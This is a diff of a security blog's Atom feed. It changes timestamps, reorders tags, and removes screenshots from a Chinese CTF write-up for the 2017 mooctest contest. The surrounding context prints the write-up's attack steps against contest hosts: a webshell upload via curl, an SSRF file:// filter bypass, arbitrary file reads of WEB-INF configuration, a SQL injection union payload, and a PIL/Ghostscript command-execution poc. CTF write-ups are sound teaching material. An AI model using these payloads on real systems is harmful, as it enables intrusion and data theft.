@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.codemonster.cn/"/>
-  <updated>2018-05-18T02:42:11.000Z</updated>
+  <updated>2018-05-18T03:50:11.000Z</updated>
   <id>https://www.codemonster.cn/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="https://www.codemonster.cn/2018/05/17/2018-t3sec-fujian-writeup/"/>
     <id>https://www.codemonster.cn/2018/05/17/2018-t3sec-fujian-writeup/</id>
     <published>2018-05-17T06:42:59.000Z</published>
-    <updated>2018-05-18T02:42:11.000Z</updated>
+    <updated>2018-05-18T03:50:11.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>时隔一年再次参加铁三，今年的赛制有点改动，企业赛个人赛和数据赛三场在同一天进行，在队友们的带领下混了个赛区第二名，成功晋级决赛。本次比赛中我主要负责的是企业赛部分，也就是对给定目标进行渗透测试，然后中间穿插着做了几道数据赛的题，这里记录一下。（因为比赛过程中没怎么截图，师傅们别打我）</p>
 <a id="more"></a>
@@ -299,9 +299,9 @@
     
       <category term="注入" scheme="https://www.codemonster.cn/tags/%E6%B3%A8%E5%85%A5/"/>
     
-      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
-    
       <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
+    
+      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
     
       <category term="CBC字节翻转攻击" scheme="https://www.codemonster.cn/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
     
@@ -397,25 +397,23 @@
     <link href="https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/"/>
     <id>https://www.codemonster.cn/2017/10/24/2017-mooctest-second-writeup/</id>
     <published>2017-10-24T05:40:13.000Z</published>
-    <updated>2018-05-04T07:47:50.012Z</updated>
+    <updated>2018-05-31T09:06:32.436Z</updated>
     
     <content type="html"><![CDATA[<p>周末去广州水了一波，比赛的时候做出来7道题，赛后补上2、3两题，下面是前9题的WriteUp，期待大佬的第10题WriteUp<br><a id="more"></a></p>
-<h2 id="1-host"><a href="#1-host" class="headerlink" title="1.host"></a>1.host</h2><p>在burpsuite中修改host为<code>www.mooctest.net</code><br><img src="/img/2017-mooctest-sec-1.png" alt=""></p>
+<h2 id="1-host"><a href="#1-host" class="headerlink" title="1.host"></a>1.host</h2><p>在burpsuite中修改host为<code>www.mooctest.net</code></p>
 <h2 id="2-Babyupload"><a href="#2-Babyupload" class="headerlink" title="2.Babyupload"></a>2.Babyupload</h2><p>扫描得到upload.php，本地构造upload.html<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form action=<span class="string">"http://114.55.36.69:46012/upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"upfile"</span>&gt;文件名：&lt;/label&gt;</div><div class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
 <p>比赛的时候死活猜不出文件参数名，file、upload、uploadfile都试过，赛后经大佬提醒才知道是<code>upfile</code><br>也可以直接用curl上传文件，学到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://114.55.36.69:46012/upload.php -F &quot;upfile=@x.php&quot;</div></pre></td></tr></table></figure></p>
-<p>上传后菜刀连接，查看web目录下的flag.php拿到flag<br><img src="/img/2017-mooctest-sec-2.png" alt=""></p>
+<p>上传后菜刀连接，查看web目录下的flag.php拿到flag</p>
 <h2 id="3-curl"><a href="#3-curl" class="headerlink" title="3.curl"></a>3.curl</h2><p>过滤了<code>file:</code>后面的<code>/</code>，把<code>/</code>转成<code>0x2f</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:46013/index.php?url=file:0x2f0x2f/var/www/html/index.php</div></pre></td></tr></table></figure></p>
-<p><img src="/img/2017-mooctest-sec-3.png" alt=""></p>
-<h2 id="4-war"><a href="#4-war" class="headerlink" title="4.war"></a>4.war</h2><p>根据题目提示，下载trick-or-treat.war<br><img src="/img/2017-mooctest-sec-4.png" alt=""></p>
+<h2 id="4-war"><a href="#4-war" class="headerlink" title="4.war"></a>4.war</h2><p>根据题目提示，下载trick-or-treat.war</p>
 <h2 id="5-readme2"><a href="#5-readme2" class="headerlink" title="5.readme2"></a>5.readme2</h2><p>在js文件里发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:46015/test/show.do?page=help.jsp</div></pre></td></tr></table></figure></p>
-<p>猜测是任意文件读取，读取javaweb工程的<code>WEB-INF/web.xml</code>文件<br><img src="/img/2017-mooctest-sec-5.png" alt=""><br>接着读取<code>WEB-INF/properties/configInfo.properties</code><br><img src="/img/2017-mooctest-sec-6.png" alt=""><br>发现<code>key.jsp</code>，读取<code>key.jsp</code><br><img src="/img/2017-mooctest-sec-7.png" alt=""></p>
-<h2 id="6-source-ip"><a href="#6-source-ip" class="headerlink" title="6.source ip"></a>6.source ip</h2><p>去fofa搜标题，试了三四个就试出来了，听说还有发邮件姿势更优雅<br><img src="/img/2017-mooctest-sec-8.png" alt=""></p>
+<p>猜测是任意文件读取，读取javaweb工程的<code>WEB-INF/web.xml</code>文件<br><img src="/img/2017-mooctest-sec-5.png" alt=""><br>接着读取<code>WEB-INF/properties/configInfo.properties</code><br><img src="/img/2017-mooctest-sec-6.png" alt=""><br>发现<code>key.jsp</code>，读取<code>key.jsp</code></p>
+<h2 id="6-source-ip"><a href="#6-source-ip" class="headerlink" title="6.source ip"></a>6.source ip</h2><p>去fofa搜标题，试了三四个就试出来了，听说还有发邮件姿势更优雅</p>
 <h2 id="7-hackedsite"><a href="#7-hackedsite" class="headerlink" title="7.hackedsite"></a>7.hackedsite</h2><p>扫描得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://118.178.18.181:46017/upload/phpspy.php</div></pre></td></tr></table></figure></p>
-<p>百度搜索phpspy得到密码<code>angle</code>，连接大马拿到flag<br><img src="/img/2017-mooctest-sec-9.png" alt=""></p>
+<p>百度搜索phpspy得到密码<code>angle</code>，连接大马拿到flag</p>
 <h2 id="8-babysql3"><a href="#8-babysql3" class="headerlink" title="8.babysql3"></a>8.babysql3</h2><p>name字段存在注入，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">keyname=1&amp;name=name` union select 1,2,flag from flag %23</div></pre></td></tr></table></figure></p>
-<p><img src="/img/2017-mooctest-sec-10.png" alt=""></p>
 <h2 id="9-snake"><a href="#9-snake" class="headerlink" title="9.snake"></a>9.snake</h2><p>提示了<code>PIL-RCE</code><br>参考<a href="https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md" target="_blank" rel="noopener">https://github.com/neargle/PIL-RCE-By-GhostButt/blob/master/Exploiting-Python-PIL-Module-Command-Execution-Vulnerability.md</a><br>构造poc文件中的代码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(%pipe%cat /var/www/Flask/flag &gt; tmp/fffffff.png)</div></pre></td></tr></table></figure></p>
-<p>上传得到flag<br><img src="/img/2017-mooctest-sec-11.png" alt=""></p>
+<p>上传得到flag</p>
 <h2 id="10-thinkphp5"><a href="#10-thinkphp5" class="headerlink" title="10.thinkphp5"></a>10.thinkphp5</h2><p>无</p>
 ]]></content>
     
@@ -742,9 +740,9 @@
     
       <category term="文件包含" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     
-      <category term="上传" scheme="https://www.codemonster.cn/tags/%E4%B8%8A%E4%BC%A0/"/>
-    
       <category term="SQL注入" scheme="https://www.codemonster.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="上传" scheme="https://www.codemonster.cn/tags/%E4%B8%8A%E4%BC%A0/"/>
     
       <category term="反序列化" scheme="https://www.codemonster.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
@@ -941,11 +939,11 @@
     
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
     
-      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
-    
       <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
     
       <category term="Crypto" scheme="https://www.codemonster.cn/tags/Crypto/"/>
+    
+      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
     
   </entry>
   
